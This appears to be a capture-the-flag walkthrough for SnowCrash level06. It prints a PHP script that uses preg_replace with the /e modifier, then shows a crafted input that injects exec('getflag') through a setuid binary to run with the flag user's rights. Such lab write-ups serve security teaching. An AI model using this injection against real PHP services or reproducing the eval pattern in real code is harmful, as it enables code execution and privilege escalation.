
```bash
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

```php
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { 
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}

function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}

$r = x($argv[1], $argv[2]);
print $r;

?>
level06@SnowCrash:~$
```

/e will execute the code that matched by the regex.

```bash
echo '[x {${exec('getflag')}}]' > /tmp/file
./level06 /tmp/file
```

By executing `level06`, `getflag` will be invoked and executed, thus retrieving the flag.